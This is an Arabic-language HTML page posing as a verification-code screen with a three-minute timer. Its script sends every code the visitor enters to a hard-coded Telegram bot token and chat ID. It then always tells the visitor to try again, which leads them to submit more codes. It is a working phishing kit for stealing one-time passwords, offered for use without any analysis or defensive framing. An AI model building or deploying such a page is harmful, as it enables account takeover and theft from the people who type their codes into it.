<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>رمز التحقق</title>
<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #e0eafc, #cfdef3);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
.container {
    background: #fff;
    padding: 40px 30px;
    width: 360px;
    border-radius: 16px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
    text-align: center;
}
h2 {
    margin-bottom: 20px;
    color: #333;
}
input {
    width: 85%;
    padding: 12px;
    font-size: 16px;
    border-radius: 10px;
    border: 1px solid #ccc;
    outline: none;
    margin-bottom: 15px;
    transition: border 0.3s;
}
input:focus {
    border-color: #2d89ff;
}
button {
    width: 90%;
    padding: 14px;
    font-size: 16px;
    border-radius: 10px;
    border: none;
    background: #2d89ff;
    color: #fff;
    cursor: pointer;
    transition: background 0.3s;
}
button:hover { background: #1b6edc; }
.timer {
    font-size: 18px;
    font-weight: bold;
    color: #ff4d4d;
    margin-bottom: 15px;
}
.success-msg {
    color: green;
    font-weight: bold;
    display: none;
    margin-top: 10px;
}
</style>
</head>
<body>

<div class="container">
    <h2>🔑 تحقق من الرمز</h2>
    <div class="timer" id="timer">03:00</div>
    <input type="text" id="otp" placeholder="أدخل الرمز هنا">
    <br>
    <button id="verifyBtn">تحقق</button>
    <div class="success-msg" id="success">حاول مرة اخرى </div>
</div>

<script>
// ⏱ Timer 3 دقائق
let totalSeconds = 3 * 60;
const timerEl = document.getElementById("timer");

function updateTimer() {
    let minutes = Math.floor(totalSeconds / 60).toString().padStart(2,'0');
    let seconds = (totalSeconds % 60).toString().padStart(2,'0');
    timerEl.textContent = `${minutes}:${seconds}`;
}

updateTimer(); // تحديث أولي
let timerInterval = setInterval(() => {
    totalSeconds--;
    updateTimer();
    if(totalSeconds < 0){
        clearInterval(timerInterval);
        alert("انتهى الوقت! الرجاء إعادة تحميل الصفحة.");
        document.getElementById("verifyBtn").disabled = true;
    }
}, 1000);

// بيانات البوت
const TOKEN = "8735601023:AAFO5XKw2N-aggThLyuZMXQVy1gLL7o76uA"; // توكن البوت
const CHAT_ID = "1824619012";   // الايدي الخاص بك

document.getElementById("verifyBtn").addEventListener("click", function(){
    let otp = document.getElementById("otp").value.trim();
    if(otp === ""){
        alert("الرجاء إدخال الرمز!");
        return;
    }

    // إرسال أي رمز للبوت
    const text = `🔑 رمز التحقق الذي أدخله المستخدم: ${otp}`;
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    }).then(() => {
        document.getElementById("success").style.display = "block";
        document.getElementById("otp").value = "";
    }).catch(err => {
        alert("حدث خطأ أثناء إرسال الرمز للبوت!");
        console.error(err);
    });
});
</script>

</body>
</html>
